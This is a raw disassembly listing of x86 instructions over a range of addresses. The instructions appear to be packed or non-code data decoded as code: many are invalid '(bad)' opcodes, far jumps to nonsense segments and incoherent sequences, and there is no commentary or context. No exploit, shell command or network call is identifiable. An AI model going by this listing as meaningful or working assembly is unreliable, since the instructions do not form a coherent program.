  427dd7:	sbb    DWORD PTR [ecx+0x28163349],0xffffffae
  427dde:	push   cs
  427ddf:	xor    edi,esi
  427de1:	in     al,0xd5
  427de3:	xor    eax,0x9c38bcf
  427de8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427de9:	inc    esp
  427dea:	sbb    DWORD PTR [edx-0x1],esi
  427ded:	push   ds
  427dee:	xor    edi,edi
  427df0:	mov    cl,0x6f
  427df2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427df3:	mov    dl,0x43
  427df5:	add    al,0x38
  427df7:	(bad)  
  427df8:	or     esi,ebx
  427dfa:	jo     0x427d8e
  427dfc:	sbb    eax,0x88bf7704
  427e01:	inc    esi
  427e02:	jmp    0x359f:0xcc9ffed3
  427e09:	mov    ecx,0xb1dbf5c1
  427e0e:	lods   eax,DWORD PTR ds:[esi]
  427e0f:	push   es
  427e10:	xor    ah,bl
  427e12:	sub    esi,DWORD PTR [ebp+0x1b]
  427e15:	push   DWORD PTR [bx]
  427e18:	push   es
  427e19:	push   edx
  427e1a:	fs sbb eax,esi
  427e1d:	ret    
  427e1e:	scas   eax,DWORD PTR es:[edi]
  427e1f:	lahf   
  427e20:	rcr    DWORD PTR ss:[eax],cl
  427e23:	xor    BYTE PTR [ebx-0xd],cl
  427e26:	popf   
  427e27:	fadd   DWORD PTR [ebp-0x34854ef]
  427e2d:	cdq    
  427e2e:	and    ebx,DWORD PTR [ebp-0x1b76d87f]
  427e34:	jecxz  0x427e31
  427e36:	pop    ecx
  427e37:	mov    ebp,0x291c979b
  427e3c:	(bad)  
  427e3d:	fiadd  DWORD PTR [ecx+0x9805]
	...
  427eb3:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  427eba:	mov    dh,0xf7
  427ebc:	mov    ebx,esi
  427ebe:	cmp    ebx,edx
  427ec0:	add    al,0xcb
  427ec2:	mov    esi,0x1a7d315
  427ec7:	add    ch,dh
  427ec9:	add    BYTE PTR [eax],al
  427ecb:	add    BYTE PTR [esi-0x2451982c],dh
  427ed1:	mov    cl,0x8b
  427ed3:	xor    edi,DWORD PTR [ecx]
  427ed5:	aaa    
  427ed6:	lds    edx,FWORD PTR [ebx+0x2]
  427ed9:	mov    bl,0x9
  427edb:	mov    ebx,0x2b02d60e
  427ee0:	sub    bl,BYTE PTR [ebp+0x1a]
  427ee3:	push   esp
  427ee4:	mov    al,ds:0x8040516e
  427ee9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427eea:	jg     0x427f4e
  427eec:	push   edi
  427eed:	mov    BYTE PTR [ebx],ah
  427eef:	imul   ebp,DWORD PTR [edx+0xc2d6411],0x5809fd76
  427ef9:	data16 int 0xc1
  427efc:	loop   0x427e86
  427efe:	lea    edi,[eax-0x3a]
  427f01:	int3   
  427f02:	pop    ecx
  427f03:	pop    edx
  427f04:	stc    
  427f05:	xchg   ebx,eax
  427f06:	push   ebx
  427f07:	fnstsw WORD PTR [eax]
  427f09:	ret    
  427f0a:	ins    BYTE PTR es:[edi],dx
  427f0b:	pop    ebp
  427f0c:	sub    al,0xa1
  427f0e:	inc    ebx
  427f0f:	dec    BYTE PTR [ecx-0x5a]
  427f12:	adc    edx,DWORD PTR [eax+edi*1-0x6674befd]
  427f19:	pop    ds
  427f1a:	mov    edx,0xe892e22a
  427f1f:	jb     0x427ef7
  427f21:	sub    ch,al
  427f23:	popa   
  427f24:	adc    BYTE PTR [ecx+0x5dce2fca],dh
  427f2a:	mov    eax,ds:0x46bb78d3
  427f2f:	inc    ecx
  427f30:	inc    ebx
  427f31:	sub    eax,0xba96c81a
  427f36:	loope  0x427ec4
  427f38:	clc    
  427f39:	(bad)  [esi-0x10ea744a]
  427f3f:	pop    eax
  427f40:	in     al,0x15
  427f42:	mov    edi,0xb7323232
  427f47:	mov    eax,ds:0xb3927270
  427f4c:	mov    ebp,0xd622fe40
  427f51:	call   0x710c:0x5e62b4a0
  427f58:	adc    dl,al
  427f5a:	push   edi
  427f5b:	scas   al,BYTE PTR es:[edi]
  427f5c:	jne    0x427f33
  427f5e:	xor    cl,BYTE PTR [ecx+0x52]
  427f61:	test   BYTE PTR [edi+0x141c8fe4],cl
  427f67:	int    0xc1
  427f69:	add    eax,0x9ac4ad3e
  427f6e:	jb     0x427f79
  427f70:	aaa    
  427f71:	mov    cl,0x86
  427f73:	xchg   esi,eax
  427f74:	ins    DWORD PTR es:[edi],dx
  427f75:	scas   eax,DWORD PTR es:[edi]
  427f76:	fbld   TBYTE PTR [edi-0x5c540ff1]
  427f7c:	jmp    0x7bdf:0x68b468f7
  427f83:	pop    esi
  427f84:	add    bh,ah
  427f86:	sahf   
  427f87:	retf   0x1b45
  427f8a:	lahf   
  427f8b:	fsub   QWORD PTR [ecx+0x39]
  427f8e:	inc    edx
  427f8f:	js     0x427f33
  427f91:	pusha  
  427f92:	hlt    
  427f93:	xor    ebx,DWORD PTR cs:[edi+0x153bcd0b]
  427f9a:	les    esi,FWORD PTR [eax+edx*4+0x23032a6d]
  427fa1:	fadd   QWORD PTR [edx]
  427fa3:	add    bh,dh
  427fa5:	cmp    DWORD PTR [ebx],0x4d
  427fa8:	sbb    bh,0x28
  427fab:	push   0xe9aa343b
  427fb0:	jnp    0x427f99
  427fb2:	out    dx,al
  427fb3:	xor    eax,0xea174aab
  427fb8:	gs dec eax
  427fba:	or     bh,BYTE PTR [ecx+0x1b63cc26]
  427fc0:	jl     0x427fc2
	...
  428032:	add    BYTE PTR [eax],al
  428034:	or     al,0x6d
  428036:	sbb    dl,BYTE PTR [ebp-0x2700885]
  42803c:	mov    DWORD PTR [ebx+0x5a],edx
  42803f:	xchg   edi,esi
  428041:	mov    ch,0x57
  428043:	jmp    0xf5:0x1a8c8
  42804a:	add    BYTE PTR [eax],al
  42804c:	retf   
  42804d:	loop   0x428043
  42804f:	sub    bl,al
  428051:	cmp    al,0x8
  428053:	mov    ah,0x24
  428055:	jbe    0x428075
  428057:	fist   WORD PTR [ecx]
  428059:	out    0xe0,al
  42805b:	retf   
  42805c:	dec    esi
  42805d:	ins    BYTE PTR es:[edi],dx
  42805e:	sbb    edi,ebx
  428060:	neg    ch
  428062:	fnstcw WORD PTR [ebx+0x51f47167]
  428068:	dec    edi
  428069:	xor    edx,DWORD PTR [ecx-0x4b]
  42806c:	push   ebx
  42806d:	mov    edi,esi
  42806f:	out    0xdc,eax
  428071:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428073:	cmp    al,0xc
  428075:	fiadd  WORD PTR [ecx-0x5d12d139]
  42807b:	or     dl,cl
  42807d:	xchg   esi,eax
  42807e:	push   esi
  42807f:	xor    BYTE PTR [edx],al
  428081:	or     DWORD PTR [ebx],ebp
  428083:	lods   eax,DWORD PTR ds:[esi]
  428084:	pop    edi
  428085:	retf   
  428086:	pop    ebp
  428087:	lahf   
  428088:	(bad)  
  428089:	ja     0x428022
  42808b:	lock in al,dx
  42808d:	int3   
  42808e:	out    dx,eax
  42808f:	or     DWORD PTR [ecx-0x37],ecx
  428092:	into   
  428093:	jg     0x42802b
  428095:	mov    esp,0xc3f69760
  42809a:	out    dx,eax
  42809b:	cld    
  42809c:	iret   
  42809d:	mov    esp,0xcb5a4b54
  4280a2:	push   0x3c
  4280a4:	xchg   esi,eax
  4280a5:	jne    0x4280f7
  4280a7:	inc    esi
  4280a8:	or     eax,0x46ef6a5f
  4280ad:	icebp  
  4280ae:	xor    BYTE PTR [eax],ah
  4280b0:	dec    edi
  4280b1:	scas   al,BYTE PTR es:[edi]
  4280b2:	xor    BYTE PTR [ecx-0x441bdb71],al
  4280b8:	cs xor esp,edi
  4280bb:	cwde   
  4280bc:	popa   
  4280bd:	retf   0x70c9
  4280c0:	fisub  DWORD PTR ds:[edx-0x26914a2c]
  4280c7:	data16 mov ch,0x31
  4280ca:	push   es
  4280cb:	ds loop 0x4280bd
  4280ce:	es stc 
  4280d0:	int3   
  4280d1:	xchg   DWORD PTR [ebp+0x27],ebp
  4280d4:	adc    ebp,DWORD PTR [ecx]
  4280d6:	es mov eax,0x4de3bf92
  4280dc:	xchg   esi,eax
  4280dd:	mov    esi,0x7b489774
  4280e2:	mov    BYTE PTR [ecx],cl
  4280e4:	push   ebx
  4280e5:	bound  ecx,QWORD PTR [eax+0x2a]
  4280e8:	mov    ds:0x1a958536,eax
  4280ed:	data16 mov bh,0x7c
  4280f0:	lods   al,BYTE PTR ds:[esi]
  4280f1:	lock inc ebp
  4280f3:	sar    BYTE PTR [edi],0xbd
  4280f6:	out    dx,eax
  4280f7:	int3   
  4280f8:	dec    ebp
  4280f9:	dec    ebp
  4280fa:	xchg   BYTE PTR [ecx-0x6d10833d],dh
  428100:	push   0x4c
  428102:	push   ds
  428103:	pop    ss
  428104:	add    DWORD PTR [ebp-0x5f58c8ca],0xbad2633c
  42810e:	aas    
  42810f:	xchg   ebx,eax
  428110:	pop    eax
  428111:	xchg   esi,eax
  428112:	aam    0x48
  428114:	and    dl,BYTE PTR [esi+ecx*2-0x36]
  428118:	xlat   BYTE PTR ds:[ebx]
  428119:	xor    al,0xc1
  42811b:	pop    ebx
  42811c:	sbb    DWORD PTR [ecx-0x66beafd9],0x4c9c82c7
  428126:	test   edx,ecx
  428128:	mul    DWORD PTR [edi-0x75043a11]
  42812e:	imul   ecx,eax,0xffffffd1
  428131:	jmp    0x7dfe:0x5f263d41
  428138:	pop    ss
  428139:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42813a:	inc    eax
  42813b:	add    al,0x26
  42813d:	mov    edx,0x1f1669
	...
  4281b2:	add    BYTE PTR [eax],al
  4281b4:	push   ds
  4281b5:	inc    ecx
  4281b6:	fdiv   QWORD PTR [edi+ebx*8+0x79eb7ebd]
  4281bd:	stos   BYTE PTR es:[edi],al
  4281be:	push   0x411c2a4f
  4281c3:	imul   edi,DWORD PTR [ebp-0xafffe57],0x0
  4281ca:	add    BYTE PTR [eax],al
  4281cc:	dec    ebx
  4281cd:	pop    ss
  4281ce:	(bad)  
  4281d0:	mov    ds:0x741fe5cf,eax
  4281d5:	cmp    bh,BYTE PTR [ebp+0x1f6eb98d]
  4281db:	or     al,0x3d
  4281dd:	pushf  
  4281de:	jno    0x42821b
  4281e0:	xchg   BYTE PTR [ebx],ch
  4281e2:	mov    bl,0x6f
  4281e4:	adc    DWORD PTR [eax],ecx
  4281e6:	push   ebp
  4281e7:	sub    DWORD PTR ds:0x73b3680,0x7da32318
  4281f1:	cwde   
  4281f2:	xchg   ebx,edx
  4281f4:	push   0xffffffff
  4281f6:	imul   ecx,eax,0xfffffff0
  4281f9:	inc    esp
  4281fa:	(bad)  
  4281fb:	push   ebx
  4281fc:	je     0x4281bc
  4281fe:	push   ecx
  4281ff:	jl     0x4281ad
  428201:	inc    edi
  428202:	lss    esi,FWORD PTR [eax+ebx*4+0x88e0940]
  42820a:	and    bl,bh
  42820c:	xchg   edi,eax
  42820d:	push   edx
  42820e:	xchg   esi,eax
  42820f:	scas   eax,DWORD PTR es:[edi]
  428210:	icebp  
  428211:	fnstcw WORD PTR [esi]
  428213:	or     bh,BYTE PTR [edi-0x4042cfa2]
  428219:	lods   al,BYTE PTR ds:[esi]
  42821a:	cmp    DWORD PTR [edi+0x5c5c7a66],ecx
  428220:	cmp    al,0xda
  428222:	in     eax,0x41
  428224:	ds scas al,BYTE PTR es:[edi]
  428226:	and    ah,BYTE PTR [esi]
  428228:	cmp    DWORD PTR [eax],ebx
  42822a:	pop    edx
  42822b:	out    0x4c,eax
  42822d:	test   DWORD PTR [eax-0x4c],esi
  428230:	mov    WORD PTR [ebx],cs
  428232:	inc    edx
  428233:	loop   0x4281d2
  428235:	(bad)  
  428236:	pop    edi
  428237:	push   ebx
  428238:	aam    0xf7
  42823a:	jg     0x4282b9
  42823c:	stc    
  42823d:	jp     0x4282a5
  42823f:	dec    ecx
  428240:	mov    bh,0xe6
  428242:	sbb    DWORD PTR fs:[ecx-0x7e9b6742],edi
  428249:	sbb    bl,BYTE PTR [ebp-0x4e0b37f2]
  42824f:	popf   
  428250:	xchg   edi,eax
  428251:	sbb    bh,BYTE PTR [ebx+edi*1-0x20]
  428255:	jne    0x4281de
  428257:	dec    edx
  428258:	push   es
  428259:	inc    esp
  42825a:	out    0x67,al
  42825c:	cwde   
  42825d:	mov    esi,0x6b30575
  428262:	test   eax,0xd5738ad4
  428267:	inc    edx
  428268:	inc    esp
  428269:	add    DWORD PTR [edx+0x17abd9e9],eax
  42826f:	or     al,0xc8
  428272:	les    eax,FWORD PTR [esi+0x23a9e406]
  428278:	inc    ecx
  428279:	(bad)  
  42827a:	jl     0x42826a
  42827c:	sub    BYTE PTR [edx-0x49],0xf7
  428280:	jbe    0x42822d
  428282:	or     al,0x9e
  428284:	xchg   eax,esi
  428286:	test   al,0x96
  428288:	imul   DWORD PTR [ebp+eax*8+0x2b]
  42828c:	dec    edi
  42828d:	pop    eax
  42828e:	ins    DWORD PTR es:[edi],dx
  42828f:	ret    0xc1ee
  428292:	jmp    0x81c5:0x826d262e
  428299:	or     ecx,ebx
  42829b:	imul   eax,DWORD PTR [eax+esi*2+0x24],0xfffffff3
  4282a0:	out    dx,eax
  4282a1:	into   
  4282a2:	pushf  
  4282a3:	jne    0x428244
  4282a5:	add    cl,BYTE PTR ds:0xb187b250
  4282ab:	in     eax,dx
  4282ac:	or     BYTE PTR [eax+0x72],bh
  4282af:	in     eax,dx
  4282b0:	add    eax,0x4fcf47
  4282b5:	in     eax,0x64
  4282b7:	jnp    0x428323
  4282b9:	jmp    0xcc24:0xa796e6ee
  4282c0:	pop    esp
	...
  428331:	add    BYTE PTR [eax],al
  428333:	add    BYTE PTR [edx],dl
  428335:	sbb    eax,0xaf3f8832
  42833a:	mov    edx,0x671fe09f
  42833f:	pusha  
  428340:	inc    esi
  428341:	pop    ss
  428342:	mov    ch,0x1f
  428344:	mov    dl,0xaa
  428346:	add    DWORD PTR [eax],eax
  428348:	cmc    
  428349:	add    BYTE PTR [eax],al
  42834b:	add    BYTE PTR [ebx-0x6160216e],cl
  428351:	in     eax,0x6e
  428353:	aam    0x9b
  428355:	pop    ds
  428356:	mov    ds:0xb7274d7b,al
  42835b:	inc    edx
  42835c:	mov    ecx,0x2e25ec98
  428361:	fldcw  WORD PTR [eax+0x52986fcb]
  428367:	mov    DWORD PTR [ecx],ebx
  428369:	out    0xc4,al
  42836b:	mov    ds:0xbf08fcd4,eax
  428370:	and    eax,0xf98d48f1
  428375:	xchg   edx,eax
  428376:	outs   dx,DWORD PTR ds:[esi]
  428377:	sbb    BYTE PTR [eax-0x17],bh
  42837a:	(bad)  
  42837b:	and    DWORD PTR [ecx+edi*2+0x4d76f838],ecx
  428382:	cmp    al,0xf4
  428384:	out    dx,al
  428385:	lock adc dh,0xc5
  428389:	out    dx,al
  42838a:	mov    ecx,DWORD PTR [ebp+0x56837e88]
  428390:	dec    ebp
  428391:	push   ecx
  428392:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428393:	mov    cl,0x72
  428395:	dec    ebp
  428396:	adc    BYTE PTR [ebx-0x440299fd],0xe6
  42839d:	stos   DWORD PTR es:[edi],eax
  42839e:	ds in  eax,0x78
  4283a1:	adc    DWORD PTR [eax-0x7c],0x7b
  4283a5:	rcpps  xmm1,XMMWORD PTR [eax-0x56f89a9e]
  4283ac:	mov    eax,0x3fe4de4
  4283b1:	xchg   edx,eax
  4283b2:	test   BYTE PTR [ecx],al
  4283b4:	je     0x428362
  4283b6:	enter  0x6a46,0x88
  4283ba:	or     BYTE PTR [eax+0xe41a876],bh
  4283c0:	adc    al,0x92
  4283c2:	pop    esp
  4283c3:	je     0x428380
  4283c5:	arpl   WORD PTR [ecx-0x2f],si
  4283c8:	fwait
  4283c9:	xchg   esi,eax
  4283ca:	inc    edx
  4283cb:	mov    edi,0xcd62a6dd
  4283d0:	push   ebp
  4283d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4283d2:	pop    ecx
  4283d3:	addr16 mov ecx,0xbade7f90
  4283d9:	inc    esi
  4283da:	stc    
  4283db:	push   0xffffffc1
  4283dd:	repz push esi
  4283df:	iret   
  4283e0:	mov    ds:0x1d7dd938,al
  4283e5:	pop    ss
  4283e6:	adc    DWORD PTR [esp+eax*8+0x36],ebp
  4283ea:	sub    cl,BYTE PTR [edi-0x61]
  4283ed:	mov    WORD PTR [eax-0x75],ss
  4283f0:	jno    0x428468
  4283f2:	dec    ebp
  4283f3:	clc    
  4283f4:	inc    bl
  4283f6:	pusha  
  4283f7:	std    
  4283f8:	ins    BYTE PTR es:[edi],dx
  4283f9:	xchg   ch,dh
  4283fb:	mov    esi,0xf54f6b5e
  428400:	loop   0x42842e
  428402:	les    edi,FWORD PTR [edi-0x73dc0766]
  428408:	dec    ebp
  428409:	ss aaa 
  42840b:	jmp    0x4283c5
  42840d:	retf   
  42840e:	popa   
  42840f:	retf   
  428410:	mov    bh,0x3d
  428412:	pop    ds
  428413:	cld    
  428414:	les    ecx,FWORD PTR [ebp-0x5676f997]
  42841a:	pop    esi
  42841b:	mov    esi,0xb7e751d7
  428420:	lea    ebp,[ebp-0x62]
  428423:	jg     0x4283ce
  428425:	push   cs
  428426:	icebp  
  428427:	loop   0x4283dd
  428429:	mov    dl,0xd2
  42842b:	cmp    al,0x64
  42842d:	sub    al,0x7a
  42842f:	xchg   ecx,eax
  428430:	(bad)  
  428432:	mov    ah,0x4c
  428434:	push   ecx
  428435:	sub    BYTE PTR [eax-0x70],bl
  428438:	cld    
  428439:	or     BYTE PTR [ebp-0x59c0fa68],ah
  42843f:	jb     0x428492
	...
  4284b1:	add    BYTE PTR [eax],al
  4284b3:	add    BYTE PTR [eax+ebp*4-0x40],bl
  4284b7:	stos   DWORD PTR es:[edi],eax
  4284b8:	hlt    
  4284b9:	jmp    0x42853a
  4284bb:	jmp    FWORD PTR [ecx-0x5a94cbf9]
  4284c1:	test   eax,0xaba78ad7
  4284c6:	add    DWORD PTR [eax],eax
  4284c8:	cmc    
  4284c9:	add    BYTE PTR [eax],al
  4284cb:	add    BYTE PTR [eax-0x28c79df0],al
  4284d1:	add    edi,DWORD PTR [ecx+0x8]
  4284d4:	adc    al,0x34
  4284d6:	test   eax,0x8c68374c
  4284db:	(bad)  
  4284de:	nop
  4284df:	imul   DWORD PTR [edi+0x437da259]
  4284e5:	dec    ebp
  4284e6:	scas   eax,DWORD PTR es:[edi]
  4284e7:	or     eax,DWORD PTR cs:[esi-0x67]
  4284eb:	icebp  
  4284ec:	pushf  
  4284ed:	out    dx,al
  4284ee:	or     DWORD PTR [ecx-0x64],esp
  4284f1:	fisttp QWORD PTR ds:0x6428a264
  4284f7:	pop    ss
  4284f8:	pop    edi
  4284f9:	lahf   
  4284fa:	icebp  
  4284fb:	jl     0x4284dd
  4284fd:	icebp  
  4284fe:	sub    ebp,edi
  428500:	lahf   
  428501:	and    bl,BYTE PTR [ebp-0x4f5cc029]
  428507:	push   0x47914be4
  42850c:	iret   
  42850d:	std    
  42850e:	xchg   ecx,ebx
  428510:	gs add cl,dl
  428513:	or     esi,ecx
  428515:	imul   esi,DWORD PTR ds:[ebx-0x23],0x46d937c4
  42851d:	sbb    eax,0x564d00b5
  428522:	int    0xca
  428524:	jns    0x4284f4
  428526:	mov    BYTE PTR [ebx-0x47d067e4],dh
  42852c:	push   cs
  42852d:	cld    
  42852e:	adc    BYTE PTR [ecx],bh
  428530:	aaa    
  428531:	test   ch,ah
  428533:	sub    eax,0xfd2cc292
  428538:	pop    ebx
  428539:	mov    ebx,0x3bfa2b07
  42853e:	imul   esi,DWORD PTR [ecx],0xf6a0d5ed
  428544:	xor    DWORD PTR [ecx+0x74],0x6c9b6da0
  42854b:	jl     0x42856f
  42854d:	inc    ebp
  42854e:	shl    DWORD PTR [ebx],0x50
  428551:	xchg   dh,dl
  428553:	xchg   esp,eax
  428554:	ins    BYTE PTR es:[edi],dx
  428555:	test   al,0x10
  428557:	bound  ebx,QWORD PTR [edx+0x3bf4aeea]
  42855d:	mov    ebp,0xa713dd0c
  428562:	push   ss
  428563:	dec    ebx
  428564:	jbe    0x42859b
  428566:	push   0x184eaf4e
  42856b:	jmp    0x826d5c8c
  428570:	bound  edi,QWORD PTR [eax-0x51e82168]
  428576:	cwde   
  428577:	lods   eax,DWORD PTR ds:[esi]
  428578:	or     al,0x57
  42857a:	mov    ecx,0xb8b3d61c
  42857f:	aas    
  428580:	jp     0x4285fd
  428582:	mov    eax,ds:0xbd0ef7b9
  428587:	lods   eax,DWORD PTR ds:[esi]
  428588:	pop    ebx
  428589:	xor    eax,0xaa078497
  42858e:	mov    ds:0xba240c5d,eax
  428593:	ss test al,0xda
  428596:	pop    edi
  428597:	std    
  428598:	gs data16 imul al
  42859c:	cs loop 0x42856d
  42859f:	mov    ecx,0xd6408db5
  4285a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4285a5:	je     0x428600
  4285a7:	stos   BYTE PTR es:[edi],al
  4285a8:	push   es
  4285a9:	out    dx,eax
  4285aa:	mov    WORD PTR [edi-0x3f1d39e8],gs
  4285b0:	fdivr  DWORD PTR [edi+0x60]
  4285b3:	inc    edi
  4285b4:	xchg   ebp,eax
  4285b5:	test   BYTE PTR [ebx+0x3ed12560],dl
  4285bb:	inc    esp
  4285bc:	sti    
  4285bd:	push   ebx
  4285be:	inc    edi
  4285bf:	test   eax,0x1f
	...
  428634:	add    DWORD PTR [esi-0x70],edx
  428637:	out    dx,al
  428638:	xlat   BYTE PTR ds:[ebx]
  428639:	out    dx,al
  42863a:	jg     0x42863b
  42863c:	(bad)  
  42863d:	dec    esi
  42863e:	cmp    al,0xb7
  428640:	shl    DWORD PTR [ebx],0x39
  428643:	in     eax,0x9c
  428645:	lods   al,BYTE PTR ds:[esi]
  428646:	add    DWORD PTR [eax],eax
  428648:	cmc    
  428649:	add    BYTE PTR [eax],al
  42864b:	add    BYTE PTR ds:0x943af71a,ch
  428651:	adc    DWORD PTR [edx-0x49513f41],0x85882041
  42865b:	in     eax,dx
  42865c:	int    0xf2
  42865e:	dec    esp
  42865f:	xor    esi,DWORD PTR [ebp+0x37]
  428662:	mov    edx,0xfc848340
  428667:	xor    al,0x99
  428669:	push   ebp
  42866a:	jmp    0x7101:0xf62ad142
  428671:	push   edx
  428672:	(bad)  
  428673:	jne    0x4286bc
  428675:	sbb    ebp,DWORD PTR [eax-0x22bdb06b]
  42867b:	cmp    al,0xd
  42867d:	test   BYTE PTR [edx],dl
  42867f:	mov    dl,0xe6
  428681:	jne    0x428621
  428683:	cmp    BYTE PTR [eax],dl
  428685:	retf   
  428686:	sbb    DWORD PTR [esi+0x10],edx
  428689:	add    eax,0x5bd8ada4
  42868e:	jle    0x42861b
  428690:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428691:	js     0x428667
  428693:	rcl    BYTE PTR [eax+0x660a8c69],0x9b
  42869a:	test   ecx,eax
  42869c:	inc    edi
  42869d:	sar    DWORD PTR ds:0x9a44d088,1
  4286a3:	ins    BYTE PTR es:[edi],dx
  4286a4:	jecxz  0x428697
  4286a6:	inc    edx
  4286a7:	mov    al,ds:0xaf420232
  4286ac:	xchg   esp,eax
  4286ad:	aaa    
  4286ae:	mov    DWORD PTR [esi+0x641b03ea],eax
  4286b4:	sub    DWORD PTR [ebp-0x493153df],eax
  4286ba:	push   ebx
  4286bb:	rcr    DWORD PTR [eax-0x15ea864d],1
  4286c1:	out    dx,eax
  4286c2:	dec    edi
  4286c3:	push   ebx
  4286c4:	ss inc esi
  4286c6:	sbb    BYTE PTR [edx+0x1716bbb7],bl
  4286cc:	mov    edi,0x241e6c15
  4286d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4286d2:	(bad)  
  4286d4:	lods   al,BYTE PTR ds:[esi]
  4286d5:	hlt    
  4286d6:	push   ds
  4286d7:	fs jns 0x4286c0
  4286da:	adc    ecx,DWORD PTR [ebx+edi*1-0x77]
  4286de:	xor    al,0xd5
  4286e0:	js     0x428751
  4286e2:	pop    edi
  4286e3:	es mov bl,0x61
  4286e6:	fisttp DWORD PTR [edx]
  4286e8:	mov    ?,WORD PTR [edx*8-0x34659f0e]
  4286ef:	xchg   ebx,eax
  4286f0:	stos   DWORD PTR es:[edi],eax
  4286f1:	cmp    eax,0xa749e9e1
  4286f6:	iret   
  4286f7:	jb     0x428700
  4286f9:	loopne 0x428757
  4286fb:	div    BYTE PTR [edx+edi*2+0x44851cd0]
  428702:	aam    0x19
  428704:	ins    DWORD PTR es:[edi],dx
  428705:	inc    edx
  428706:	xor    ebp,DWORD PTR [ebx-0x4b0ae495]
  42870c:	or     dh,BYTE PTR [ebp+ebp*8-0x7d]
  428710:	arpl   WORD PTR ds:0xd9469909,dx
  428716:	fimul  DWORD PTR [eax]
  428718:	xor    al,0x46
  42871a:	rcr    bl,cl
  42871c:	test   eax,0x466e1d2a
  428721:	call   0x83471229
  428726:	jb     0x4286de
  428728:	syscall 
  42872a:	cld    
  42872b:	cld    
  42872c:	(bad)  
  42872d:	repnz mov es,WORD PTR [ebx+0x75]
  428731:	or     cl,cl
  428733:	jp     0x428730
  428735:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428736:	sub    DWORD PTR [ebx-0x68],0xa38aec55
  42873d:	mov    ecx,DWORD PTR [ebx+eax*4+0xda]
	...
  4287b4:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  4287ba:	pop    esi
  4287bb:	fbstp  TBYTE PTR [ebx]
  4287bd:	mov    edx,0x6691299e
  4287c2:	push   0x1ad9195
  4287c7:	add    ch,dh
  4287c9:	add    BYTE PTR [eax],al
  4287cb:	add    BYTE PTR [ebp-0x22],al
  4287ce:	or     eax,0xb2ead5e3
  4287d3:	inc    edx
  4287d4:	xor    ebp,DWORD PTR [edi-0xaf927d1]
  4287da:	clc    
  4287db:	ror    BYTE PTR [ecx+0x63],1
  4287de:	mov    esp,ebp
  4287e0:	inc    edi
  4287e1:	fnstcw WORD PTR [esi+0x20]
  4287e4:	cmp    BYTE PTR [ebx-0x12],cl
  4287e7:	push   eax
  4287e8:	ins    BYTE PTR es:[edi],dx
  4287e9:	pop    edx
  4287ea:	retf   
  4287eb:	adc    esi,DWORD PTR [ebp+0x32275197]
  4287f1:	adc    al,0xb7
  4287f3:	rol    BYTE PTR [eax-0x4b],cl
  4287f6:	outs   dx,DWORD PTR ds:[esi]
  4287f7:	ss jecxz 0x42882a
  4287fa:	int3   
  4287fb:	dec    eax
  4287fc:	repz push ebx
  4287fe:	push   esp
  4287ff:	fwait
  428800:	jmp    DWORD PTR [edi-0x1960f802]
  428806:	and    al,0x55
  428808:	push   ebp
  428809:	xchg   ebp,eax
  42880a:	xor    eax,0x894da45f
  42880f:	ficom  WORD PTR [esi]
  428811:	inc    edi
  428812:	add    DWORD PTR [esi+0x5c134afd],edi
  428818:	push   ds
  428819:	ja     0x4287d9
  42881b:	mov    al,ds:0xa9866447
  428820:	mov    ebx,0xcc677b95
  428825:	push   edx
  428826:	push   0x8
  428828:	cli    
  428829:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42882a:	div    eax
  42882c:	call   0x74ae:0x76d447ec
  428833:	aas    
  428834:	test   eax,0x81b165f8
  428839:	inc    edi
  42883a:	inc    ecx
  42883b:	push   edx
  42883c:	jecxz  0x42886d
  42883e:	fadd   DWORD PTR [ebx-0x4606e695]
  428844:	repnz (bad) 
  428848:	pushf  
  428849:	sbb    dl,al
  42884b:	adc    cl,ch
  42884d:	daa    
  42884e:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  428850:	mov    edi,0xcefab9aa
  428855:	rol    DWORD PTR [edx+0x4f],0x35
  428859:	jns    0x4288c5
  42885b:	pcmpgtw mm3,QWORD PTR ds:0x5fd5681
  428862:	loopne 0x4287e6
  428864:	mov    ebp,0xc9dfb
  428869:	lods   al,BYTE PTR ds:[esi]
  42886a:	jl     0x42888c
  42886c:	inc    edx
  42886d:	mov    ch,0x41
  42886f:	sbb    DWORD PTR [edx-0x63],edi
  428872:	in     al,dx
  428873:	jle    0x4287fd
  428875:	inc    edx
  428876:	jnp    0x4288f0
  428878:	jbe    0x428808
  42887a:	add    esp,DWORD PTR [ecx+0x4b0b5f8b]
  428880:	jp     0x428825
  428882:	and    al,0x73
  428884:	mov    fs,WORD PTR [ebp+0x645b0171]
  42888a:	push   edx
  42888b:	cmp    BYTE PTR [ecx],bh
  42888d:	add    esi,ecx
  42888f:	add    DWORD PTR [ebp-0x3f],0x1d6cb589
  428896:	sub    al,0x7
  428898:	add    BYTE PTR ds:0x4c2d673a,bh
  42889e:	sar    DWORD PTR [esi],0x22
  4288a1:	mov    ?,WORD PTR [ebx+eax*2]
  4288a4:	pop    esp
  4288a5:	xor    ah,BYTE PTR [ecx-0x2c]
  4288a8:	leave  
  4288a9:	and    DWORD PTR ds:0xe55a0f95,0x289ba826
  4288b3:	push   ss
  4288b4:	jmp    0x14f7966d
  4288b9:	pop    ds
  4288ba:	stc    
  4288bb:	mov    BYTE PTR [ecx*1+0x60bdb0],dh
	...
  428932:	add    BYTE PTR [eax],al
  428934:	call   0xdea3:0xffa3ffdd
  42893b:	std    
  42893c:	clc    
  42893d:	jns    0x4289b6
  42893f:	jmp    0xae86:0xfce0c01d
  428946:	add    DWORD PTR [eax],eax
  428948:	cmc    
  428949:	add    BYTE PTR [eax],al
  42894b:	add    bl,ch
  42894d:	mov    dh,0xd
  42894f:	mov    dh,0x84
  428951:	cwde   
  428952:	shl    DWORD PTR [eax-0x3f1c41aa],cl
  428958:	xchg   ebp,eax
  428959:	jae    0x428944
  42895b:	mov    ecx,0xc7396364
